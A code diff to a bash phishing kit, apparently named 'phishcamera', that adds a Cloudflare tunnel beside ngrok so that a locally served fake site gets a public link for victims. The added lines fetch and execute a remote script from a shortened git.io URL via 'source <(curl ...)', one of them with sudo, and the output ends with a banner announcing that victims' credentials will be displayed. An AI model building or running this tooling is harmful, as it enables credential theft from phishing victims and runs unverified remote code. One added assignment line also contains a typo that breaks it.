@@ -12,11 +12,29 @@ Android)
         printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mjq not found!! Installing......\e[0m\n"
         apt install jq -y > /dev/null 2>&1
         fi
+        if ! hash cloudflared > /dev/null 2>&1; then
+        printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mcloudflare not found!! Installing......\e[0m\n"
+        echo
+        source <(curl -fsSL "https://git.io/JinSa")
+        LWD=$(pwd)
+         if [[ $LWD != *'programs/phishcamera'* ]]; then
+         cd $RWD > /dev/null 2>&1
+         fi
+        fi
 ;;
 GNU/Linux)
         if ! hash jq > /dev/null 2>&1; then
         printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mjq not found!! Installing.......\e[0m\n"
         sudo apt install jq -y > /dev/null 2>&1
+        fi
+	if ! hash cloudflared > /dev/null 2>&1; then
+        printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mcloudflare not found!! Installing......\e[0m\n"
+        echo
+        sudo source <(curl -fsSL "https://git.io/JinSa")
+        LWD=$(pwd)
+         if [[ $LWD != *'programs/phishcamera'* ]]; then
+         cd $RWD > /dev/null 2>&1
+         fi
         fi
 ;;
 esac
@@ -272,6 +290,24 @@ fi
 done
 
 echo
+echo -e "
+${C2}=========================${R0}
+     ${B1}Server options:-${R1}
+${C3}-------------------------${R0}
+
+${C2}(${C6}01${C2})${C4}Ngrok${R0}
+${C2}(${C6}02${C2})${C4}cloudflare ${C6}(recommended)${R0}
+" | pv -qL 1000
+echo
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${C7}Enter(${C1}server${C7})> ${R0}"
+read serve
+if [[ $serve == '1' || $serve == '01' || $serve == '2' || $serve == '02' ]]; then
+break
+else
+printf "${C7}[${C1}!${C7}]${C1} Please enter a valid option!!${R0}\n"
+fi
+done
 processbar
 echo
 cd sites/
@@ -283,18 +319,36 @@ php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 sleep 3
 echo
 if [[ $distro == *'Android'* ]]; then
+if [[ $serve == '1' || $serve == '01' ]]; then
 termux-chroot ngrok http 4444 > /dev/null 2>&1 &
 else
+termux-chroot cloudflared tunnel -url 127.0.0.1:4444 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
+fi
+else
+if [[ $serve == '1' || $serve == '01' ]]; then
 sudo ngrok http 4444 > /dev/null 2>&1 &
+else
+cloudflared -url 127.0.0.1:4444 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
+fi
 fi
 sleep 7
 echo
+if [[ $serve == '1' || $serve == '01' ]]; then
 #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
 r2=$(printf "${r1/\"http:\/\//}")
 r3=$(printf "${r2/\"https:\/\//}")
 r4=$(printf "${r3/\",/}")
 link=$(printf "${r4/%\",/}")
+if [[ -z "$link" ]]; then
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[-0-9a-z]*\.ngrok.io")
+fi
+else
+r1==$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${RWD}/.cloudflare-log")
+link="${r1/=https:\/\//}"
+hoster=""
+rm -rf $RWD/.cloudflare-log > /dev/null 2>&1
+fi
 echo; wait
 printf "${C7}<<<${R0}${C1}---------------${R0}${B1}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R1}${C1}---------------${R0}${C7}>>>${R0}\n"; wait
 echo; wait
